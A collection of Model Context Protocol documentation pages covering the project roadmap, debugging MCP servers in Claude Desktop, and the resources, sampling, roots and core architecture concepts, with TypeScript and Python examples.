{"source":"github","repo":"mcp-spec","path":"docs/development/roadmap.mdx","content":"---\ntitle: Roadmap\ndescription: Our plans for evolving Model Context Protocol\n---\n\n<Info>Last updated: **2025-10-31**</Info>\n\nThe Model Context Protocol is rapidly evolving. This page outlines our priorities for **the next release on November 25th, 2025**, with a release candidate available on November 11th, 2025. To see what's changing in the upcoming release, check out the **[specification changelog](/specification/draft/changelog/)**.\n\nFor more context on our release timeline and governance process, read our [blog post on the next version update](https://blog.modelcontextprotocol.io/posts/2025-09-26-mcp-next-version-update/).\n\n<Note>\n\nThe ideas presented here are not commitments—we may solve these challenges differently than described, or some may not materialize at all. This is also not an _exhaustive_ list; we may incorporate work that isn't mentioned here.\n\n</Note>\n\nWe value community participation! Each section links to relevant discussions where you can learn more and contribute your thoughts.\n\nFor a technical view of our standardization process, visit the [Standards Track](https://github.com/orgs/modelcontextprotocol/projects/2/views/2) on GitHub, which tracks how proposals progress toward inclusion in the official [MCP specification](https://spec.modelcontextprotocol.io).\n\n## Priority Areas for the Next Release\n\n### Asynchronous Operations\n\nCurrently, MCP is built around mostly synchronous operations. We're adding async support to allow servers to kick off long-running tasks while clients can check back later for results. This will enable operations that take minutes or hours without blocking.\n\nFollow the progress in [SEP-1686](https://github.com/modelcontextprotocol/modelcontextprotocol/issues/1686).\n\n### Statelessness and Scalability\n\nAs organizations deploy MCP servers at enterprise scale, we're addressing challenges around horizontal scaling. While [Streamable HTTP](https://modelcontextprotocol.io/specification/2025-03-26/basic/transports#streamable-http) provides some stateless support, we're smoothing out rough edges around server startup and session handling to make it easier to run MCP servers in production.\n\nThe current focus point for this effort is [SEP-1442](https://github.com/modelcontextprotocol/modelcontextprotocol/issues/1442).\n\n### Server Identity\n\nWe're enabling servers to advertise themselves through [`.well-known` URLs](https://en.wikipedia.org/wiki/Well-known_URI)—an established standard for providing metadata. This will allow clients to discover what a server can do without having to connect to it first, making discovery much more intuitive and enabling systems like our registry to automatically catalog capabilities. We are working closely across multiple projects in the industry to rely on a common standard on agent cards.\n\n### Official Extensions\n\nAs MCP has grown, valuable patterns have emerged for specific industries and use cases. Rather than leaving everyone to reinvent the wheel, we're officially recognizing and documenting the most popular protocol extensions. This curated collection will give developers building for specialized domains like healthcare, finance, or education a solid starting point.\n\n### SDK Support Standardization\n\nWe're introducing a clear tiering system for SDKs based on factors like specification compliance speed, maintenance responsiveness, and feature completeness. This will help developers understand exactly what level of support they're getting before committing to a dependency.\n\n### MCP Registry General Availability\n\nThe [MCP Registry](https://github.com/modelcontextprotocol/registry) launched in preview in September 2025 and is progressing toward general availability. We're stabilizing the v0.1 API through real-world integrations and community feedback, with plans to transition from preview to a production-ready service. This will provide developers with a reliable, community-driven platform for discovering and sharing MCP servers.\n\n## Validation\n\nTo foster a robust developer ecosystem, we plan to invest in:\n\n- **Reference Client Implementations**: demonstrating protocol features with high-quality AI applications\n- **Reference Server Implementation**: showcasing authentication patterns and remote deployment best practices\n- **Compliance Test Suites**: automated verification that clients, servers, and SDKs properly implement the specification\n\nThese tools will help developers confidently implement MCP while ensuring consistent behavior across the ecosystem.\n\n## Get Involved\n\nWe welcome your contributions to MCP's future! Join our [GitHub Discussions](https://github.com/orgs/modelcontextprotocol/discussions) to share ideas, provide feedback, or participate in the development process.\n"}
{"source":"github","repo":"mcp-spec","path":"docs/legacy/tools/debugging.mdx","content":"---\ntitle: Debugging\ndescription: A comprehensive guide to debugging Model Context Protocol (MCP) integrations\n---\n\nEffective debugging is essential when developing MCP servers or integrating them with applications. This guide covers the debugging tools and approaches available in the MCP ecosystem.\n\n<Info>\n\nThis guide is for macOS. Guides for other platforms are coming soon.\n\n</Info>\n\n## Debugging tools overview\n\nMCP provides several tools for debugging at different levels:\n\n1. **MCP Inspector**\n   - Interactive debugging interface\n   - Direct server testing\n   - See the [Inspector guide](/docs/tools/inspector) for details\n\n2. **Claude Desktop Developer Tools**\n   - Integration testing\n   - Log collection\n   - Chrome DevTools integration\n\n3. **Server Logging**\n   - Custom logging implementations\n   - Error tracking\n   - Performance monitoring\n\n## Debugging in Claude Desktop\n\n### Checking server status\n\nThe Claude.app interface provides basic server status information:\n\n1. Click the <img src=\"/images/claude-desktop-mcp-plug-icon.svg\" style={{display: 'inline', margin: 0, height: '1.3em'}} /> icon to view:\n   - Connected servers\n   - Available prompts and resources\n\n2. Click the \"Search and tools\" <img src=\"/images/claude-desktop-mcp-slider.svg\" style={{display: 'inline', margin: 0, height: '1.3em'}} /> icon to view:\n   - Tools made available to the model\n\n### Viewing logs\n\nReview detailed MCP logs from Claude Desktop:\n\n```bash\n# Follow logs in real-time\ntail -n 20 -F ~/Library/Logs/Claude/mcp*.log\n```\n\nThe logs capture:\n\n- Server connection events\n- Configuration issues\n- Runtime errors\n- Message exchanges\n\n### Using Chrome DevTools\n\nAccess Chrome's developer tools inside Claude Desktop to investigate client-side errors:\n\n1. Create a `developer_settings.json` file with `allowDevTools` set to true:\n\n```bash\necho '{\"allowDevTools\": true}' > ~/Library/Application\\ Support/Claude/developer_settings.json\n```\n\n2. Open DevTools: `Command-Option-Shift-i`\n\nNote: You'll see two DevTools windows:\n\n- Main content window\n- App title bar window\n\nUse the Console panel to inspect client-side errors.\n\nUse the Network panel to inspect:\n\n- Message payloads\n- Connection timing\n\n## Common issues\n\n### Working directory\n\nWhen using MCP servers with Claude Desktop:\n\n- The working directory for servers launched via `claude_desktop_config.json` may be undefined (like `/` on macOS) since Claude Desktop could be started from anywhere\n- Always use absolute paths in your configuration and `.env` files to ensure reliable operation\n- For testing servers directly via command line, the working directory will be where you run the command\n\nFor example in `claude_desktop_config.json`, use:\n\n```json\n{\n  \"command\": \"npx\",\n  \"args\": [\n    \"-y\",\n    \"@modelcontextprotocol/server-filesystem\",\n    \"/Users/username/data\"\n  ]\n}\n```\n\nInstead of relative paths like `./data`\n\n### Environment variables\n\nMCP servers inherit only a subset of environment variables automatically, like `USER`, `HOME`, and `PATH`.\n\nTo override the default variables or provide your own, you can specify an `env` key in `claude_desktop_config.json`:\n\n```json\n{\n  \"myserver\": {\n    \"command\": \"mcp-server-myapp\",\n    \"env\": {\n      \"MYAPP_API_KEY\": \"some_key\"\n    }\n  }\n}\n```\n\n### Server initialization\n\nCommon initialization problems:\n\n1. **Path Issues**\n   - Incorrect server executable path\n   - Missing required files\n   - Permission problems\n   - Try using an absolute path for `command`\n\n2. **Configuration Errors**\n   - Invalid JSON syntax\n   - Missing required fields\n   - Type mismatches\n\n3. **Environment Problems**\n   - Missing environment variables\n   - Incorrect variable values\n   - Permission restrictions\n\n### Connection problems\n\nWhen servers fail to connect:\n\n1. Check Claude Desktop logs\n2. Verify server process is running\n3. Test standalone with [Inspector](/docs/tools/inspector)\n4. Verify protocol compatibility\n\n## Implementing logging\n\n### Server-side logging\n\nWhen building a server that uses the local stdio [transport](/legacy/concepts/transports), all messages logged to stderr (standard error) will be captured by the host application (e.g., Claude Desktop) automatically.\n\n<Warning>\n\nLocal MCP servers should not log messages to stdout (standard out), as this will interfere with protocol operation.\n\n</Warning>\n\nFor all [transports](/legacy/concepts/transports), you can also provide logging to the client by sending a log message notification:\n\n<CodeGroup>\n\n```python Python\nserver.request_context.session.send_log_message(\n  level=\"info\",\n  data=\"Server started successfully\",\n)\n```\n\n```typescript TypeScript\nserver.sendLoggingMessage({\n  level: \"info\",\n  data: \"Server started successfully\",\n});\n```\n\n</CodeGroup>\n\nImportant events to log:\n\n- Initialization steps\n- Resource access\n- Tool execution\n- Error conditions\n- Performance metrics\n\n### Client-side logging\n\nIn client applications:\n\n1. Enable debug logging\n2. Monitor network traffic\n3. Track message exchanges\n4. Record error states\n\n## Debugging workflow\n\n### Development cycle\n\n1. Initial Development\n   - Use [Inspector](/legacy/tools/inspector) for basic testing\n   - Implement core functionality\n   - Add logging points\n\n2. Integration Testing\n   - Test in Claude Desktop\n   - Monitor logs\n   - Check error handling\n\n### Testing changes\n\nTo test changes efficiently:\n\n- **Configuration changes**: Restart Claude Desktop\n- **Server code changes**: Use Command-R to reload\n- **Quick iteration**: Use [Inspector](/legacy/tools/inspector) during development\n\n## Best practices\n\n### Logging strategy\n\n1. **Structured Logging**\n   - Use consistent formats\n   - Include context\n   - Add timestamps\n   - Track request IDs\n\n2. **Error Handling**\n   - Log stack traces\n   - Include error context\n   - Track error patterns\n   - Monitor recovery\n\n3. **Performance Tracking**\n   - Log operation timing\n   - Monitor resource usage\n   - Track message sizes\n   - Measure latency\n\n### Security considerations\n\nWhen debugging:\n\n1. **Sensitive Data**\n   - Sanitize logs\n   - Protect credentials\n   - Mask personal information\n\n2. **Access Control**\n   - Verify permissions\n   - Check authentication\n   - Monitor access patterns\n\n## Getting help\n\nWhen encountering issues:\n\n1. **First Steps**\n   - Check server logs\n   - Test with [Inspector](/legacy/tools/inspector)\n   - Review configuration\n   - Verify environment\n\n2. **Support Channels**\n   - GitHub issues\n   - GitHub discussions\n\n3. **Providing Information**\n   - Log excerpts\n   - Configuration files\n   - Steps to reproduce\n   - Environment details\n\n## Next steps\n\n<CardGroup cols={2}>\n  <Card\n    title=\"MCP Inspector\"\n    icon=\"magnifying-glass\"\n    href=\"/legacy/tools/inspector\"\n  >\n    Learn to use the MCP Inspector\n  </Card>\n</CardGroup>\n"}

{"source":"github","repo":"mcp-spec","path":"docs/legacy/concepts/resources.mdx","content":"---\ntitle: \"Resources\"\ndescription: \"Expose data and content from your servers to LLMs\"\n---\n\nResources are a core primitive in the Model Context Protocol (MCP) that allow servers to expose data and content that can be read by clients and used as context for LLM interactions.\n\n<Note>\n\nResources are designed to be **application-controlled**, meaning that the client application can decide how and when they should be used.\nDifferent MCP clients may handle resources differently. For example:\n\n- Claude Desktop currently requires users to explicitly select resources before they can be used\n- Other clients might automatically select resources based on heuristics\n- Some implementations may even allow the AI model itself to determine which resources to use\n\nServer authors should be prepared to handle any of these interaction patterns when implementing resource support. In order to expose data to models automatically, server authors should use a **model-controlled** primitive such as [Tools](./tools).\n\n</Note>\n\n## Overview\n\nResources represent any kind of data that an MCP server wants to make available to clients. This can include:\n\n- File contents\n- Database records\n- API responses\n- Live system data\n- Screenshots and images\n- Log files\n- And more\n\nEach resource is identified by a unique URI and can contain either text or binary data.\n\n## Resource URIs\n\nResources are identified using URIs that follow this format:\n\n```\n[protocol]://[host]/[path]\n```\n\nFor example:\n\n- `file:///home/user/documents/report.pdf`\n- `postgres://database/customers/schema`\n- `screen://localhost/display1`\n\nThe protocol and path structure is defined by the MCP server implementation. Servers can define their own custom URI schemes.\n\n## Resource types\n\nResources can contain two types of content:\n\n### Text resources\n\nText resources contain UTF-8 encoded text data. These are suitable for:\n\n- Source code\n- Configuration files\n- Log files\n- JSON/XML data\n- Plain text\n\n### Binary resources\n\nBinary resources contain raw binary data encoded in base64. These are suitable for:\n\n- Images\n- PDFs\n- Audio files\n- Video files\n- Other non-text formats\n\n## Resource discovery\n\nClients can discover available resources through two main methods:\n\n### Direct resources\n\nServers expose a list of resources via the `resources/list` request. Each resource includes:\n\n```typescript\n{\n  uri: string;           // Unique identifier for the resource\n  name: string;          // The name of the resource\n  title?: string;        // Optional human-readable name of the resource for display purposes\n  description?: string;  // Optional description\n  mimeType?: string;     // Optional MIME type\n  size?: number;         // Optional size in bytes\n}\n```\n\n### Resource templates\n\nFor dynamic resources, servers can expose [URI templates](https://datatracker.ietf.org/doc/html/rfc6570) that clients can use to construct valid resource URIs:\n\n```typescript\n{\n  uriTemplate: string;   // URI template following RFC 6570\n  name: string;          // The name of the type\n  title?: string;        // Optional Human-readable name of the type for display purposes\n  description?: string;  // Optional description\n  mimeType?: string;     // Optional MIME type for all matching resources\n}\n```\n\n## Reading resources\n\nTo read a resource, clients make a `resources/read` request with the resource URI.\n\nThe server responds with a list of resource contents:\n\n```typescript\n{\n  contents: [\n    {\n      uri: string;        // The URI of the resource\n      name?: string;      // The name of the resource\n      title?: string;     // Optional human-readable name of the resource for display purposes\n      mimeType?: string;  // Optional MIME type\n\n      // One of:\n      text?: string;      // For text resources\n      blob?: string;      // For binary resources (base64 encoded)\n    }\n  ]\n}\n```\n\n<Tip>\n\nServers may return multiple resources in response to one `resources/read` request. This could be used, for example, to return a list of files inside a directory when the directory is read.\n\n</Tip>\n\n## Resource updates\n\nMCP supports real-time updates for resources through two mechanisms:\n\n### List changes\n\nServers can notify clients when their list of available resources changes via the `notifications/resources/list_changed` notification.\n\n### Content changes\n\nClients can subscribe to updates for specific resources:\n\n1. Client sends `resources/subscribe` with resource URI\n2. Server sends `notifications/resources/updated` when the resource changes\n3. Client can fetch latest content with `resources/read`\n4. Client can unsubscribe with `resources/unsubscribe`\n\n## Example implementation\n\nHere's a simple example of implementing resource support in an MCP server:\n\n<CodeGroup>\n\n```typescript TypeScript\nconst server = new Server(\n  {\n    name: \"example-server\",\n    version: \"1.0.0\",\n  },\n  {\n    capabilities: {\n      resources: {},\n    },\n  },\n);\n\n// List available resources\nserver.setRequestHandler(ListResourcesRequestSchema, async () => {\n  return {\n    resources: [\n      {\n        uri: \"file:///logs/app.log\",\n        name: \"Application Logs\",\n        mimeType: \"text/plain\",\n      },\n    ],\n  };\n});\n\n// Read resource contents\nserver.setRequestHandler(ReadResourceRequestSchema, async (request) => {\n  const uri = request.params.uri;\n\n  if (uri === \"file:///logs/app.log\") {\n    const logContents = await readLogFile();\n    return {\n      contents: [\n        {\n          uri,\n          mimeType: \"text/plain\",\n          text: logContents,\n        },\n      ],\n    };\n  }\n\n  throw new Error(\"Resource not found\");\n});\n```\n\n```python Python\napp = Server(\"example-server\")\n\n@app.list_resources()\nasync def list_resources() -> list[types.Resource]:\n    return [\n        types.Resource(\n            uri=\"file:///logs/app.log\",\n            name=\"Application Logs\",\n            mimeType=\"text/plain\"\n        )\n    ]\n\n@app.read_resource()\nasync def read_resource(uri: AnyUrl) -> str:\n    if str(uri) == \"file:///logs/app.log\":\n        log_contents = await read_log_file()\n        return log_contents\n\n    raise ValueError(\"Resource not found\")\n\n# Start server\nasync with stdio_server() as streams:\n    await app.run(\n        streams[0],\n        streams[1],\n        app.create_initialization_options()\n    )\n```\n\n</CodeGroup>\n\n## Best practices\n\nWhen implementing resource support:\n\n1. Use clear, descriptive resource names and URIs\n2. Include helpful descriptions to guide LLM understanding\n3. Set appropriate MIME types when known\n4. Implement resource templates for dynamic content\n5. Use subscriptions for frequently changing resources\n6. Handle errors gracefully with clear error messages\n7. Consider pagination for large resource lists\n8. Cache resource contents when appropriate\n9. Validate URIs before processing\n10. Document your custom URI schemes\n\n## Security considerations\n\nWhen exposing resources:\n\n- Validate all resource URIs\n- Implement appropriate access controls\n- Sanitize file paths to prevent directory traversal\n- Be cautious with binary data handling\n- Consider rate limiting for resource reads\n- Audit resource access\n- Encrypt sensitive data in transit\n- Validate MIME types\n- Implement timeouts for long-running reads\n- Handle resource cleanup appropriately\n"}
{"source":"github","repo":"mcp-spec","path":"docs/legacy/concepts/sampling.mdx","content":"---\ntitle: \"Sampling\"\ndescription: \"Let your servers request completions from LLMs\"\n---\n\nSampling is a powerful MCP feature that allows servers to request LLM completions through the client, enabling sophisticated agentic behaviors while maintaining security and privacy.\n\n<Info>\n\nThis feature of MCP is not yet supported in the Claude Desktop client.\n\n</Info>\n\n## How sampling works\n\nThe sampling flow follows these steps:\n\n1. Server sends a `sampling/createMessage` request to the client\n2. Client reviews the request and can modify it\n3. Client samples from an LLM\n4. Client reviews the completion\n5. Client returns the result to the server\n\nThis human-in-the-loop design ensures users maintain control over what the LLM sees and generates.\n\n## Message format\n\nSampling requests use a standardized message format:\n\n```typescript\n{\n  messages: [\n    {\n      role: \"user\" | \"assistant\",\n      content: {\n        type: \"text\" | \"image\",\n\n        // For text:\n        text?: string,\n\n        // For images:\n        data?: string,             // base64 encoded\n        mimeType?: string\n      }\n    }\n  ],\n  modelPreferences?: {\n    hints?: [{\n      name?: string                // Suggested model name/family\n    }],\n    costPriority?: number,         // 0-1, importance of minimizing cost\n    speedPriority?: number,        // 0-1, importance of low latency\n    intelligencePriority?: number  // 0-1, importance of capabilities\n  },\n  systemPrompt?: string,\n  includeContext?: \"none\" | \"thisServer\" | \"allServers\",\n  temperature?: number,\n  maxTokens: number,\n  stopSequences?: string[],\n  metadata?: Record<string, unknown>\n}\n```\n\n## Request parameters\n\n### Messages\n\nThe `messages` array contains the conversation history to send to the LLM. Each message has:\n\n- `role`: Either \"user\" or \"assistant\"\n- `content`: The message content, which can be:\n  - Text content with a `text` field\n  - Image content with `data` (base64) and `mimeType` fields\n\n### Model preferences\n\nThe `modelPreferences` object allows servers to specify their model selection preferences:\n\n- `hints`: Array of model name suggestions that clients can use to select an appropriate model:\n  - `name`: String that can match full or partial model names (e.g. \"claude-3\", \"sonnet\")\n  - Clients may map hints to equivalent models from different providers\n  - Multiple hints are evaluated in preference order\n\n- Priority values (0-1 normalized):\n  - `costPriority`: Importance of minimizing costs\n  - `speedPriority`: Importance of low latency response\n  - `intelligencePriority`: Importance of advanced model capabilities\n\nClients make the final model selection based on these preferences and their available models.\n\n### System prompt\n\nAn optional `systemPrompt` field allows servers to request a specific system prompt. The client may modify or ignore this.\n\n### Context inclusion\n\nThe `includeContext` parameter specifies what MCP context to include:\n\n- `\"none\"`: No additional context\n- `\"thisServer\"`: Include context from the requesting server\n- `\"allServers\"`: Include context from all connected MCP servers\n\nThe client controls what context is actually included.\n\n### Sampling parameters\n\nFine-tune the LLM sampling with:\n\n- `temperature`: Controls randomness (0.0 to 1.0)\n- `maxTokens`: Maximum tokens to generate\n- `stopSequences`: Array of sequences that stop generation\n- `metadata`: Additional provider-specific parameters\n\n## Response format\n\nThe client returns a completion result:\n\n```typescript\n{\n  model: string,  // Name of the model used\n  stopReason?: \"endTurn\" | \"stopSequence\" | \"maxTokens\" | string,\n  role: \"user\" | \"assistant\",\n  content: {\n    type: \"text\" | \"image\",\n    text?: string,\n    data?: string,\n    mimeType?: string\n  }\n}\n```\n\n## Example request\n\nHere's an example of requesting sampling from a client:\n\n```json\n{\n  \"method\": \"sampling/createMessage\",\n  \"params\": {\n    \"messages\": [\n      {\n        \"role\": \"user\",\n        \"content\": {\n          \"type\": \"text\",\n          \"text\": \"What files are in the current directory?\"\n        }\n      }\n    ],\n    \"systemPrompt\": \"You are a helpful file system assistant.\",\n    \"includeContext\": \"thisServer\",\n    \"maxTokens\": 100\n  }\n}\n```\n\n## Best practices\n\nWhen implementing sampling:\n\n1. Always provide clear, well-structured prompts\n2. Handle both text and image content appropriately\n3. Set reasonable token limits\n4. Include relevant context through `includeContext`\n5. Validate responses before using them\n6. Handle errors gracefully\n7. Consider rate limiting sampling requests\n8. Document expected sampling behavior\n9. Test with various model parameters\n10. Monitor sampling costs\n\n## Human in the loop controls\n\nSampling is designed with human oversight in mind:\n\n### For prompts\n\n- Clients should show users the proposed prompt\n- Users should be able to modify or reject prompts\n- System prompts can be filtered or modified\n- Context inclusion is controlled by the client\n\n### For completions\n\n- Clients should show users the completion\n- Users should be able to modify or reject completions\n- Clients can filter or modify completions\n- Users control which model is used\n\n## Security considerations\n\nWhen implementing sampling:\n\n- Validate all message content\n- Sanitize sensitive information\n- Implement appropriate rate limits\n- Monitor sampling usage\n- Encrypt data in transit\n- Handle user data privacy\n- Audit sampling requests\n- Control cost exposure\n- Implement timeouts\n- Handle model errors gracefully\n\n## Common patterns\n\n### Agentic workflows\n\nSampling enables agentic patterns like:\n\n- Reading and analyzing resources\n- Making decisions based on context\n- Generating structured data\n- Handling multi-step tasks\n- Providing interactive assistance\n\n### Context management\n\nBest practices for context:\n\n- Request minimal necessary context\n- Structure context clearly\n- Handle context size limits\n- Update context as needed\n- Clean up stale context\n\n### Error handling\n\nRobust error handling should:\n\n- Catch sampling failures\n- Handle timeout errors\n- Manage rate limits\n- Validate responses\n- Provide fallback behaviors\n- Log errors appropriately\n\n## Limitations\n\nBe aware of these limitations:\n\n- Sampling depends on client capabilities\n- Users control sampling behavior\n- Context size has limits\n- Rate limits may apply\n- Costs should be considered\n- Model availability varies\n- Response times vary\n- Not all content types supported\n"}
{"source":"github","repo":"mcp-spec","path":"docs/legacy/concepts/roots.mdx","content":"---\ntitle: \"Roots\"\ndescription: \"Understanding roots in MCP\"\n---\n\nRoots are a concept in MCP that define the boundaries where servers can operate. They provide a way for clients to inform servers about relevant resources and their locations.\n\n## What are Roots?\n\nA root is a URI that a client suggests a server should focus on. When a client connects to a server, it declares which roots the server should work with. While primarily used for filesystem paths, roots can be any valid URI including HTTP URLs.\n\nFor example, roots could be:\n\n```\nfile:///home/user/projects/myapp\nhttps://api.example.com/v1\n```\n\n## Why Use Roots?\n\nRoots serve several important purposes:\n\n1. **Guidance**: They inform servers about relevant resources and locations\n2. **Clarity**: Roots make it clear which resources are part of your workspace\n3. **Organization**: Multiple roots let you work with different resources simultaneously\n\n## How Roots Work\n\nWhen a client supports roots, it:\n\n1. Declares the `roots` capability during connection\n2. Provides a list of suggested roots to the server\n3. Notifies the server when roots change (if supported)\n\nWhile roots are informational and not strictly enforcing, servers should:\n\n1. Respect the provided roots\n2. Use root URIs to locate and access resources\n3. Prioritize operations within root boundaries\n\n## Common Use Cases\n\nRoots are commonly used to define:\n\n- Project directories\n- Repository locations\n- API endpoints\n- Configuration locations\n- Resource boundaries\n\n## Best Practices\n\nWhen working with roots:\n\n1. Only suggest necessary resources\n2. Use clear, descriptive names for roots\n3. Monitor root accessibility\n4. Handle root changes gracefully\n\n## Example\n\nHere's how a typical MCP client might expose roots:\n\n```json\n{\n  \"roots\": [\n    {\n      \"uri\": \"file:///home/user/projects/frontend\",\n      \"name\": \"Frontend Repository\"\n    },\n    {\n      \"uri\": \"https://api.example.com/v1\",\n      \"name\": \"API Endpoint\"\n    }\n  ]\n}\n```\n\nThis configuration suggests the server focus on both a local repository and an API endpoint while keeping them logically separated.\n"}
{"source":"github","repo":"mcp-spec","path":"docs/legacy/concepts/architecture.mdx","content":"---\ntitle: \"Core architecture\"\ndescription: \"Understand how MCP connects clients, servers, and LLMs\"\n---\n\nThe Model Context Protocol (MCP) is built on a flexible, extensible architecture that enables seamless communication between LLM applications and integrations. This document covers the core architectural components and concepts.\n\n## Overview\n\nMCP follows a client-server architecture where:\n\n- **Hosts** are LLM applications (like Claude Desktop or IDEs) that initiate connections\n- **Clients** maintain 1:1 connections with servers, inside the host application\n- **Servers** provide context, tools, and prompts to clients\n\n```mermaid\nflowchart LR\n    subgraph \"Host\"\n        client1[MCP Client]\n        client2[MCP Client]\n    end\n    subgraph \"Server Process\"\n        server1[MCP Server]\n    end\n    subgraph \"Server Process\"\n        server2[MCP Server]\n    end\n\n    client1 <-->|Transport Layer| server1\n    client2 <-->|Transport Layer| server2\n```\n\n## Core components\n\n### Protocol layer\n\nThe protocol layer handles message framing, request/response linking, and high-level communication patterns.\n\n<CodeGroup>\n\n```typescript TypeScript\nclass Protocol<Request, Notification, Result> {\n  // Handle incoming requests\n  setRequestHandler<T>(\n    schema: T,\n    handler: (request: T, extra: RequestHandlerExtra) => Promise<Result>,\n  ): void;\n\n  // Handle incoming notifications\n  setNotificationHandler<T>(\n    schema: T,\n    handler: (notification: T) => Promise<void>,\n  ): void;\n\n  // Send requests and await responses\n  request<T>(request: Request, schema: T, options?: RequestOptions): Promise<T>;\n\n  // Send one-way notifications\n  notification(notification: Notification): Promise<void>;\n}\n```\n\n```python Python\nclass Session(BaseSession[RequestT, NotificationT, ResultT]):\n    async def send_request(\n        self,\n        request: RequestT,\n        result_type: type[Result]\n    ) -> Result:\n        \"\"\"Send request and wait for response. Raises McpError if response contains error.\"\"\"\n        # Request handling implementation\n\n    async def send_notification(\n        self,\n        notification: NotificationT\n    ) -> None:\n        \"\"\"Send one-way notification that doesn't expect response.\"\"\"\n        # Notification handling implementation\n\n    async def _received_request(\n        self,\n        responder: RequestResponder[ReceiveRequestT, ResultT]\n    ) -> None:\n        \"\"\"Handle incoming request from other side.\"\"\"\n        # Request handling implementation\n\n    async def _received_notification(\n        self,\n        notification: ReceiveNotificationT\n    ) -> None:\n        \"\"\"Handle incoming notification from other side.\"\"\"\n        # Notification handling implementation\n```\n\n</CodeGroup>\n\nKey classes include:\n\n- `Protocol`\n- `Client`\n- `Server`\n\n### Transport layer\n\nThe transport layer handles the actual communication between clients and servers. MCP supports multiple transport mechanisms:\n\n1. **Stdio transport**\n   - Uses standard input/output for communication\n   - Ideal for local processes\n\n2. **Streamable HTTP transport**\n   - Uses HTTP with optional Server-Sent Events for streaming\n   - HTTP POST for client-to-server messages\n\nAll transports use [JSON-RPC](https://www.jsonrpc.org/) 2.0 to exchange messages. See the [specification](/specification/) for detailed information about the Model Context Protocol message format.\n\n### Message types\n\nMCP has these main types of messages:\n\n1. **Requests** expect a response from the other side:\n\n   ```typescript\n   interface Request {\n     method: string;\n     params?: { ... };\n   }\n   ```\n\n2. **Results** are successful responses to requests:\n\n   ```typescript\n   interface Result {\n     [key: string]: unknown;\n   }\n   ```\n\n3. **Errors** indicate that a request failed:\n\n   ```typescript\n   interface Error {\n     code: number;\n     message: string;\n     data?: unknown;\n   }\n   ```\n\n4. **Notifications** are one-way messages that don't expect a response:\n   ```typescript\n   interface Notification {\n     method: string;\n     params?: { ... };\n   }\n   ```\n\n## Connection lifecycle\n\n### 1. Initialization\n\n```mermaid\nsequenceDiagram\n    participant Client\n    participant Server\n\n    Client->>Server: initialize request\n    Server->>Client: initialize response\n    Client->>Server: initialized notification\n\n    Note over Client,Server: Connection ready for use\n```\n\n1. Client sends `initialize` request with protocol version and capabilities\n2. Server responds with its protocol version and capabilities\n3. Client sends `initialized` notification as acknowledgment\n4. Normal message exchange begins\n\n### 2. Message exchange\n\nAfter initialization, the following patterns are supported:\n\n- **Request-Response**: Client or server sends requests, the other responds\n- **Notifications**: Either party sends one-way messages\n\n### 3. Termination\n\nEither party can terminate the connection:\n\n- Clean shutdown via `close()`\n- Transport disconnection\n- Error conditions\n\n## Error handling\n\nMCP defines these standard error codes:\n\n```typescript\nenum ErrorCode {\n  // Standard JSON-RPC error codes\n  ParseError = -32700,\n  InvalidRequest = -32600,\n  MethodNotFound = -32601,\n  InvalidParams = -32602,\n  InternalError = -32603,\n\n  // MCP-specific error codes in the range [-32000, -32099]\n  UrlElicitationRequired = -32042,\n}\n```\n\nSDKs and applications can define their own error codes above -32000.\n\nErrors are propagated through:\n\n- Error responses to requests\n- Error events on transports\n- Protocol-level error handlers\n\n## Implementation example\n\nHere's a basic example of implementing an MCP server:\n\n<CodeGroup>\n\n```typescript TypeScript\nimport { Server } from \"@modelcontextprotocol/sdk/server/index.js\";\nimport { StdioServerTransport } from \"@modelcontextprotocol/sdk/server/stdio.js\";\n\nconst server = new Server(\n  {\n    name: \"example-server\",\n    version: \"1.0.0\",\n  },\n  {\n    capabilities: {\n      resources: {},\n    },\n  },\n);\n\n// Handle requests\nserver.setRequestHandler(ListResourcesRequestSchema, async () => {\n  return {\n    resources: [\n      {\n        uri: \"example://resource\",\n        name: \"Example Resource\",\n      },\n    ],\n  };\n});\n\n// Connect transport\nconst transport = new StdioServerTransport();\nawait server.connect(transport);\n```\n\n```python Python\nimport asyncio\nimport mcp.types as types\nfrom mcp.server import Server\nfrom mcp.server.stdio import stdio_server\n\napp = Server(\"example-server\")\n\n@app.list_resources()\nasync def list_resources() -> list[types.Resource]:\n    return [\n        types.Resource(\n            uri=\"example://resource\",\n            name=\"Example Resource\"\n        )\n    ]\n\nasync def main():\n    async with stdio_server() as streams:\n        await app.run(\n            streams[0],\n            streams[1],\n            app.create_initialization_options()\n        )\n\nif __name__ == \"__main__\":\n    asyncio.run(main())\n```\n\n</CodeGroup>\n\n## Best practices\n\n### Transport selection\n\n1. **Local communication**\n   - Use stdio transport for local processes\n   - Efficient for same-machine communication\n   - Simple process management\n\n2. **Remote communication**\n   - Use Streamable HTTP for scenarios requiring HTTP compatibility\n   - Consider security implications including authentication and authorization\n\n### Message handling\n\n1. **Request processing**\n   - Validate inputs thoroughly\n   - Use type-safe schemas\n   - Handle errors gracefully\n   - Implement timeouts\n\n2. **Progress reporting**\n   - Use progress tokens for long operations\n   - Report progress incrementally\n   - Include total progress when known\n\n3. **Error management**\n   - Use appropriate error codes\n   - Include helpful error messages\n   - Clean up resources on errors\n\n## Security considerations\n\n1. **Transport security**\n   - Use TLS for remote connections\n   - Validate connection origins\n   - Implement authentication when needed\n\n2. **Message validation**\n   - Validate all incoming messages\n   - Sanitize inputs\n   - Check message size limits\n   - Verify JSON-RPC format\n\n3. **Resource protection**\n   - Implement access controls\n   - Validate resource paths\n   - Monitor resource usage\n   - Rate limit requests\n\n4. **Error handling**\n   - Don't leak sensitive information\n   - Log security-relevant errors\n   - Implement proper cleanup\n   - Handle DoS scenarios\n\n## Debugging and monitoring\n\n1. **Logging**\n   - Log protocol events\n   - Track message flow\n   - Monitor performance\n   - Record errors\n\n2. **Diagnostics**\n   - Implement health checks\n   - Monitor connection state\n   - Track resource usage\n   - Profile performance\n\n3. **Testing**\n   - Test different transports\n   - Verify error handling\n   - Check edge cases\n   - Load test servers\n"}
